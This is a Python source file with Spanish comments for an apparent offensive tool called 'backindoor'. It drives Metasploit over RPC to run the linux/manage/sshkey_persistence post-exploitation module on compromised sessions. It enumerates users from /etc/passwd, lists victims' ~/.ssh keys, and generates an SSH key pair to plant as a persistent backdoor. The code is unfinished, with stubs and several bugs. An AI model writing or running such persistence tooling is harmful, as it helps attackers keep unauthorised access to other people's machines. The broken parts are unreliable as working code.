# TODO: funciones
#   - get_modules()
#   - get_sessions()
#   - set_options()
#   - create_session() Se crea como salida de la ejecucion de modulos que generen meterpreter
#   - remove_session()
#   - _

# from db import *
from pymetasploit3.msfrpc import *
import paramiko
import os


class Msf:

    def __init__(self) -> None:
        # self.client = MsfRpcClient('backindoor', port=55553, ssl=True)
        self.client = MsfRpcClient('backindoor', port=55553, ssl=False)
        self.msf_console_list = []
    

    def msf_ssh_key(self):
        # try:
        if self.client.sessions.list:
            module = self.client.modules.use('post', 'linux/manage/sshkey_persistence')
            print(module.description)
            print()
            # Listar sesiones existentes al usuario
            in1 = input('MSF Session [1] -> ').strip()
            if in1 != '' and in1 in self.client.sessions.list.keys():
                module['SESSION'] = int(in1)
            else:
                module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
                print('WARM: Selected session doesnt exists. Selecting session 1')

            console = self.create_msf_console()
            console.write('cut -d: -f1 /etc/passwd')
            users_list = console.read().split()
            # TODO: GUARDAR LISTA DE USUARIOS CON LA RESPUESTA DE LA CONSOLA
            # TODO: EXCLUIR TODOS LOS USUARIOS DE SISTEMA

            in2 = input('Username [all] -> ').strip()
            if in2 != '' and in2 in users_list:
                module['USERNAME'] = in2

            in3 = input('Public key [all] -> ').strip()
            # Buscar claves SSH en directorio por defecto del usuario
            console.write('ls ${HOME}/.ssh')
            ssh_keys_list = console.read().split()
            
            if in3 != '' and in3 in ssh_keys_list:
                module['PUBKEY'] = in3
            else:
                self.ssh_key_gen()

            in4 = input('SSHD config [default] -> ').strip()
            if in4 != '':
                # TODO: COMPROBAR QUE ES UNA RUTA VALIDA
                module['SSHD_CONFIG'] = in4

            in5 = input('Create SSHD folder [no] -> ').strip()
            if in5 == 'yes':
                module['CREATESSHFOLDER'] = 'true'
            print()

            msf_console_id = self.client.consoles.console().cid
            msf_console = self.client.consoles.console(msf_console_id)
            print(msf_console.run_module_with_output(module))
            msf_console.destroy()
            return module['SESSION']

        else:
            print('-- HOT: Requiere al menos una sesion MSF activa')
            return False
            
        # except:
        #     print('-- ERROR: No hay servidor RPC activo')


# TODO: COMRPOBRAR FUNCIONAMIENTO GET_MSF_CONSOLE(), CREATE_MSF_CONSOLE(), SSH_KEY_GEN()

    def ssh_key_gen(self):
        # Guardar directorio HOME del usuario
        home_dir = os.environ['HOME']
        # Generar una nueva clave SSH
        private_key = paramiko.RSAKey.generate(2048)
        # Guardar la clave privada en un archivo
        private_key.write_private_key_file(home_dir + '/.ssh/bid0_key')

        # Guardar la clave pública en un archivo
        with open(home_dir + '/.ssh/bid0_key.pub', 'w') as file:
            file.write(f'{private_key.get_name()} {private_key.get_base64()}')

        print('COOL: Clave SSH generada exitosamente.')

    def create_msf_console(self):
        self.msf_console_list.append(self.client.consoles.console().cid)
        return self.msf_console_list[-1]
    
    def get_msf_console(self, id_console):
        # Si no hay ninguna consola creada, se crea una nueva
        if len(self.msf_console_list) == 0:
            return self.create_msf_console()
        # Si hay consola creada y existe el parametro id_console, se busca y si no se encuetra, devuelve None
        elif id_console:
            for console in self.msf_console_list:
                if id_console == console.id:
                    return console
            return None
        # Si no recibe el parametro id_console, devuelve la lista de consolas
        else:
            return self.msf_console_list
            



    def get_modules(self):
        return self.client.modules.post
        

    def select_module(self, name):
        return self.client.modules.use('post', name)
    

    def get_missing_required(self, module):
        return module.missing_required


    def config_module():
        pass

    def get_sessions(self):
        if self.client.sessions.list:
            return self.client.sessions.list
        else:
            return None
        
    def get_session(self, id):
        if len(self.client.sessions.list) > 1:
            return self.client.sessions.list[id]
        else:
            return None

    def create_session():
        pass

    def remove_session():
        pass



def get_modules(client, type):
    if type == 'post':
        client.modules.post
    elif type == 'multi':
        client.modules.multi
    elif type == 'auxiliary':
        client.modules.auxiliary
    elif type == 'payloads':
        client.modules.payloads
    elif type == 'nops':
        client.modules.nops
    elif type == 'encodeformats':
        client.modules.encodeformats
    elif type == 'encoders':
        client.modules.encoders
    elif type == 'evasion':
        client.modules.evasion
    elif type == 'platforms':
        client.modules.evasion





